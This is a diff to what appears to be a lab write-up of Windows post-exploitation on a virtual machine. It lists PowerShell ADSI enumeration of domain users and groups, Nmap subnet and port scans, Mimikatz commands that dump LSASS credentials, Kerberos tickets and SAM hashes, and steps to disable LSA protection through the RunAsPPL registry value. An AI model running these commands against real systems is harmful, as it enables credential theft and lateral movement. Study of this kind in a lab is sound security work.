@@ -209,17 +209,75 @@ reg query HKLM /f password /t REG_SZ /s #searches top-level registry hive for en
 
 #### Active Directory
 
-- enter code and results here
+- All users and groups in the domain were listed along with their paths for further mapping of the network topology to start exploration and lateral movement. The following code was entered into a PowerShell window using escalated privileges obtained by the previous phase.
+
+- Users:
+  ```
+  [ADSI]WinNT://$env:USERDOMAIN" #connects to active directory using Active Directory Service Interfaces (ADSI)
+  $domain = [ADSI]"WinNT://$env:USERDOMAIN" #environment variable that points to Windows domain
+  $domain Children | Where-Object { $_.SchemaClassName -eq 'User' } #filters all objects for user accounts
+  ```
+  <img width="3840" height="2160" alt="list of all users on domain" src="https://github.com/user-attachments/assets/2ae30b19-9984-4d66-acc8-8a28d6a4fd05" />
+
+- Groups:
+  ```
+  $domain.Children | Where-Object { $_.SchemaClassName -eq 'Group' } #filters all objects for group property
+  ```
+  <img width="3840" height="2160" alt="list of all groups on domain" src="https://github.com/user-attachments/assets/151d3cfb-b385-4053-ba39-e7b837437d13" />
 
 #### Nmap Scanning
 
-- Nmap must be installed, which can be done on Windows using this link - nmap.org/download.
-- enter code and results here
+- Nmap must be installed, which can be done on Windows using this link - nmap.org/download. It is a free resource and is able to scan networks and create topologies for easy mapping and exploration. This helps in finding weak ports that can be easily exploited by the malware. The following code was entered into the command feature on the Nmap GUI.
 
+- Ping Scan:
+  ```
+  nmap -sn 192.168.1.0/24 #sends probe packets and lists which hosts respond
+  ```
+  <img width="3840" height="2160" alt="ping scan, all hosts on subnet (nmap)" src="https://github.com/user-attachments/assets/60021945-1c51-440d-97b7-15d81afdd16e" />
+
+- Range Scan:
+  ```
+  nmap 192.168.1.1-20 #attempts to find what ports/services are open
+  ```
+  <img width="3840" height="2160" alt="scanned a range of ports to find weak areas (netmap)" src="https://github.com/user-attachments/assets/c6e41e20-269e-4338-bffb-330cf3665cf7" />
+
+- Common TCP Port Scan:
+  ```
+  nmap 192.168.1.10 #scan top 1000 most common TCP ports to determine what services are running
+  ```
+  <img width="3840" height="2160" alt="scanned 1000 most common ports (nmap)" src="https://github.com/user-attachments/assets/8aa1dad5-29b8-4ba2-9994-ffea178fbe87" />
+
+- After making use of the scans listed above, Nmap will automatically create a network topology diagram. Below is the local network graph created for the workstation:
+<img width="3840" height="2160" alt="local network topology mapped (nmap)" src="https://github.com/user-attachments/assets/f2087128-3fb8-4c86-bef4-c5db009eefac" />
+  
 #### Stolen Kerberos Ticket
 
-- enter something here
+- Kerberos tickets are part of the authentication protocol that verifies identities without the need for users to send passwords over the network multiple times. This decreases the chance of interception of packets with vital information and saves time for users as they are only required to log in once. However, by using Mimikatz, malicious actors can steal and even forge such tickets to send around the network, authenticating themselves without the need for a plaintext password.
+  ```
+  sekurlsa::minidump lsass.dump #a snapshot of the local security authority subsystem service (LSASS) is loaded
+  sekurlsa::logonpasswords #extracts and displays Kerberos tickets from LSASS memory
+  ```
+  <img width="2205" height="357" alt="attempt to steal kerberos tickets (before turning off)" src="https://github.com/user-attachments/assets/27ebda62-a803-441c-bbda-f37149161987" />
+
+- An error has occurred due to unprivileged access to memory. To fix this, a register must be removed from the Registry Editor. By going to Computer > HKEY-LOCAL-MACHINE > SYSTEM > CurrentControlSet > Control > Lsa, the 'RunAsPPL' register can be found with either a value of 1 or 2. Edit this number to be 0 to turn off, removing the additional protections enforced by Windows that restrict memory access. 
+
+  <img width="3840" height="2160" alt="lsass protection is turned off by attacker " src="https://github.com/user-attachments/assets/2b1a5fd4-559f-4710-8200-6de0d460b2db" />
+
+- Now we can run the following code:
+(NOTE: There is still an error present, as there are no other logins on the virtual machine besides the current user.)
+  ```
+  privilege::debug
+  sekurlsa::tickets
+  ```
+  <img width="3840" height="2160" alt="after restarting, success just no passwords to steal" src="https://github.com/user-attachments/assets/09feec23-de05-4747-b8e5-e0d86acb3efa" />
+
 
 #### Pass-the-Hash
 
-- enter something here
+- By using previous codes from early phases with Mimikatz, a pass-the-hash log has been generated and is ready to be sent. This will allow the attacker to be authenticated in a remote system without access to a plaintext password.
+  ```
+  privilege::debug
+  lsadump::sam
+  ```
+  <img width="3840" height="2160" alt="pass the hash" src="https://github.com/user-attachments/assets/5e478791-1c45-4901-b66d-89af71013c96" />
+
